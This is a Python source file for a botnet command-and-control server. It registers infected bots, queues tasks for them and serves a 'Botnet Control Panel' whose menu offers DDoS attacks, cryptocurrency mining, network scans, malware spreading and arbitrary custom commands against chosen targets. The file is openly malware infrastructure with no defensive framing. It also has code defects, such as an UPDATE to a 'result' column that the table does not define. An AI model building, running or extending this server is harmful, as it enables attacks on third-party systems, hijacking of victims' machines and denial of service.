# c2_server.py
import socket
import threading
import ssl
import json
import base64
import sqlite3
import hashlib
import time
from cryptography.fernet import Fernet
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import queue

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")
task_queue = queue.Queue()
bot_registry = {}
active_tasks = {}

# Database setup
def init_db():
    conn = sqlite3.connect('botnet.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bots
                 (id TEXT PRIMARY KEY, ip TEXT, last_seen INTEGER, 
                  os TEXT, cpu TEXT, gpu TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                  command TEXT, target TEXT, status TEXT, 
                  created_at INTEGER, completed_at INTEGER)''')
    conn.commit()
    conn.close()

# Encryption setup
def generate_key():
    return Fernet.generate_key()

key = generate_key()
cipher_suite = Fernet(key)

# Authentication
def authenticate(data):
    try:
        decoded = cipher_suite.decrypt(data.encode()).decode()
        auth_data = json.loads(decoded)
        
        # Check if bot ID exists in database
        conn = sqlite3.connect('botnet.db')
        c = conn.cursor()
        c.execute("SELECT id FROM bots WHERE id=?", (auth_data['bot_id'],))
        result = c.fetchone()
        conn.close()
        
        if result:
            return True, auth_data['bot_id']
        return False, None
    except Exception as e:
        print(f"Authentication error: {e}")
        return False, None

# Bot registration
@app.route('/register', methods=['POST'])
def register_bot():
    try:
        data = request.get_data()
        is_auth, bot_id = authenticate(data)
        
        if not is_auth:
            return jsonify({"status": "error", "message": "Authentication failed"}), 401
        
        # Extract bot information
        decoded = cipher_suite.decrypt(data.encode()).decode()
        bot_info = json.loads(decoded)
        
        # Store bot information
        conn = sqlite3.connect('botnet.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO bots 
                    (id, ip, last_seen, os, cpu, gpu, status) 
                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                 (bot_id, request.remote_addr, int(time.time()),
                  bot_info.get('os', 'unknown'), 
                  bot_info.get('cpu', 'unknown'),
                  bot_info.get('gpu', 'unknown'), 'active'))
        conn.commit()
        conn.close()
        
        # Add to bot registry
        bot_registry[bot_id] = {
            'ip': request.remote_addr,
            'last_seen': int(time.time()),
            'socket_id': None
        }
        
        return jsonify({"status": "success", "bot_id": bot_id})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Task distribution
@app.route('/get_task', methods=['POST'])
def get_task():
    try:
        data = request.get_data()
        is_auth, bot_id = authenticate(data)
        
        if not is_auth:
            return jsonify({"status": "error", "message": "Authentication failed"}), 401
        
        # Check if there's a task for this bot
        if not task_queue.empty():
            task = task_queue.get()
            
            # Store task assignment
            conn = sqlite3.connect('botnet.db')
            c = conn.cursor()
            c.execute('''INSERT INTO tasks (command, target, status, created_at) 
                        VALUES (?, ?, ?, ?)''',
                     (task['command'], task.get('target', ''), 'assigned', int(time.time())))
            task_id = c.lastrowid
            conn.commit()
            conn.close()
            
            active_tasks[task_id] = {
                'bot_id': bot_id,
                'command': task['command'],
                'target': task.get('target', ''),
                'status': 'in_progress'
            }
            
            return jsonify({
                "status": "success", 
                "task_id": task_id,
                "command": task['command'],
                "target": task.get('target', '')
            })
        
        return jsonify({"status": "success", "message": "No tasks available"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Result submission
@app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        data = request.get_data()
        is_auth, bot_id = authenticate(data)
        
        if not is_auth:
            return jsonify({"status": "error", "message": "Authentication failed"}), 401
        
        # Extract result data
        decoded = cipher_suite.decrypt(data.encode()).decode()
        result_data = json.loads(decoded)
        
        task_id = result_data.get('task_id')
        result = result_data.get('result')
        
        # Update task status
        if task_id in active_tasks:
            active_tasks[task_id]['status'] = 'completed'
            active_tasks[task_id]['result'] = result
            
            conn = sqlite3.connect('botnet.db')
            c = conn.cursor()
            c.execute('''UPDATE tasks SET status=?, completed_at=?, result=?
                        WHERE id=?''',
                     ('completed', int(time.time()), result, task_id))
            conn.commit()
            conn.close()
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# WebSocket for real-time communication
@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('register_socket')
def handle_register_socket(data):
    try:
        bot_id = data.get('bot_id')
        if bot_id in bot_registry:
            bot_registry[bot_id]['socket_id'] = request.sid
            emit('registration_confirmed', {'status': 'success'})
    except Exception as e:
        emit('error', {'message': str(e)})

@socketio.on('heartbeat')
def handle_heartbeat(data):
    try:
        bot_id = data.get('bot_id')
        if bot_id in bot_registry:
            bot_registry[bot_id]['last_seen'] = int(time.time())
            emit('heartbeat_ack', {'timestamp': int(time.time())})
    except Exception as e:
        emit('error', {'message': str(e)})

# Admin interface
@app.route('/admin', methods=['GET'])
def admin_interface():
    # Simple HTML admin interface
    return """
    <html>
    <head>
        <title>Botnet Control Panel</title>
        <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .container { max-width: 1200px; margin: 0 auto; }
            .panel { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
            .bot-list { max-height: 300px; overflow-y: auto; }
            .task-form { display: flex; gap: 10px; margin-bottom: 15px; }
            .task-form input, .task-form select, .task-form button { padding: 8px; }
            .task-form button { background: #4CAF50; color: white; border: none; cursor: pointer; }
            .task-form button:hover { background: #45a049; }
            .bot-item { padding: 10px; border-bottom: 1px solid #eee; }
            .bot-item:last-child { border-bottom: none; }
            .status { display: inline-block; padding: 3px 8px; border-radius: 3px; font-size: 12px; }
            .status.active { background: #dff0d8; color: #3c763d; }
            .status.inactive { background: #f2dede; color: #a94442; }
            .status.busy { background: #fcf8e3; color: #8a6d3b; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Botnet Control Panel</h1>
            
            <div class="panel">
                <h2>Create New Task</h2>
                <div class="task-form">
                    <select id="commandType">
                        <option value="ddos">DDoS Attack</option>
                        <option value="mining">Cryptocurrency Mining</option>
                        <option value="scan">Network Scan</option>
                        <option value="spread">Spread Malware</option>
                        <option value="custom">Custom Command</option>
                    </select>
                    <input type="text" id="target" placeholder="Target IP/URL">
                    <input type="text" id="customCommand" placeholder="Custom Command" style="display:none;">
                    <button id="createTask">Create Task</button>
                </div>
            </div>
            
            <div class="panel">
                <h2>Bot Network Status</h2>
                <div id="botCount">Loading bots...</div>
                <div class="bot-list" id="botList"></div>
            </div>
            
            <div class="panel">
                <h2>Active Tasks</h2>
                <div id="taskList">Loading tasks...</div>
            </div>
        </div>
        
        <script>
            const socket = io();
            
            // Update command type visibility
            document.getElementById('commandType').addEventListener('change', function() {
                const customCommand = document.getElementById('customCommand');
                if (this.value === 'custom') {
                    customCommand.style.display = 'inline-block';
                } else {
                    customCommand.style.display = 'none';
                }
            });
            
            // Create task
            document.getElementById('createTask').addEventListener('click', function() {
                const commandType = document.getElementById('commandType').value;
                const target = document.getElementById('target').value;
                const customCommand = document.getElementById('customCommand').value;
                
                let command = commandType;
                if (commandType === 'custom') {
                    command = customCommand;
                }
                
                fetch('/create_task', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        command: command,
                        target: target
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert('Task created successfully!');
                    } else {
                        alert('Error creating task: ' + data.message);
                    }
                });
            });
            
            // Load bot list
            function loadBotList() {
                fetch('/bot_list')
                .then(response => response.json())
                .then(data => {
                    const botList = document.getElementById('botList');
                    botList.innerHTML = '';
                    
                    if (data.bots && data.bots.length > 0) {
                        data.bots.forEach(bot => {
                            const botItem = document.createElement('div');
                            botItem.className = 'bot-item';
                            
                            const statusClass = bot.status === 'active' ? 'active' : 
                                              bot.status === 'busy' ? 'busy' : 'inactive';
                            
                            botItem.innerHTML = `
                                <strong>${bot.id}</strong> 
                                <span class="status ${statusClass}">${bot.status}</span>
                                <br>
                                <small>IP: ${bot.ip} | OS: ${bot.os} | Last seen: ${new Date(bot.last_seen * 1000).toLocaleString()}</small>
                            `;
                            
                            botList.appendChild(botItem);
                        });
                        
                        document.getElementById('botCount').textContent = `Total Bots: ${data.bots.length} (${data.active_count} active)`;
                    } else {
                        document.getElementById('botCount').textContent = 'No bots registered';
                        botList.innerHTML = '<p>No bots available</p>';
                    }
                });
            }
            
            // Load task list
            function loadTaskList() {
                fetch('/task_list')
                .then(response => response.json())
                .then(data => {
                    const taskList = document.getElementById('taskList');
                    taskList.innerHTML = '';
                    
                    if (data.tasks && data.tasks.length > 0) {
                        data.tasks.forEach(task => {
                            const taskItem = document.createElement('div');
                            taskItem.className = 'task-item';
                            
                            taskItem.innerHTML = `
                                <strong>Task #${task.id}</strong> - ${task.command}
                                <br>
                                <small>Target: ${task.target || 'N/A'} | Status: ${task.status} | 
                                Created: ${new Date(task.created_at * 1000).toLocaleString()}</small>
                            `;
                            
                            taskList.appendChild(taskItem);
                        });
                    } else {
                        taskList.innerHTML = '<p>No active tasks</p>';
                    }
                });
            }
            
            // Initial load
            loadBotList();
            loadTaskList();
            
            // Refresh every 10 seconds
            setInterval(() => {
                loadBotList();
                loadTaskList();
            }, 10000);
        </script>
    </body>
    </html>
    """

# API endpoints for admin interface
@app.route('/create_task', methods=['POST'])
def create_task():
    try:
        data = request.json
        command = data.get('command')
        target = data.get('target')
        
        if not command:
            return jsonify({"status": "error", "message": "Command is required"}), 400
        
        # Add task to queue
        task = {
            'command': command,
            'target': target
        }
        task_queue.put(task)
        
        return jsonify({"status": "success", "message": "Task created"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/bot_list', methods=['GET'])
def get_bot_list():
    try:
        conn = sqlite3.connect('botnet.db')
        c = conn.cursor()
        c.execute("SELECT * FROM bots")
        bots = c.fetchall()
        
        # Get column names
        column_names = [description[0] for description in c.description]
        
        # Convert to list of dictionaries
        bot_list = []
        active_count = 0
        
        for bot in bots:
            bot_dict = dict(zip(column_names, bot))
            bot_list.append(bot_dict)
            
            # Check if bot is active (last seen within 5 minutes)
            if int(time.time()) - bot_dict['last_seen'] < 300:
                bot_dict['status'] = 'active'
                active_count += 1
            else:
                bot_dict['status'] = 'inactive'
        
        conn.close()
        
        return jsonify({"bots": bot_list, "active_count": active_count})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/task_list', methods=['GET'])
def get_task_list():
    try:
        conn = sqlite3.connect('botnet.db')
        c = conn.cursor()
        c.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 20")
        tasks = c.fetchall()
        
        # Get column names
        column_names = [description[0] for description in c.description]
        
        # Convert to list of dictionaries
        task_list = []
        
        for task in tasks:
            task_dict = dict(zip(column_names, task))
            task_list.append(task_dict)
        
        conn.close()
        
        return jsonify({"tasks": task_list})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    init_db()
    # Use SSL for secure communication
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.load_cert_chain('server.crt', 'server.key')
    socketio.run(app, host='0.0.0.0', port=443, ssl_context=context)
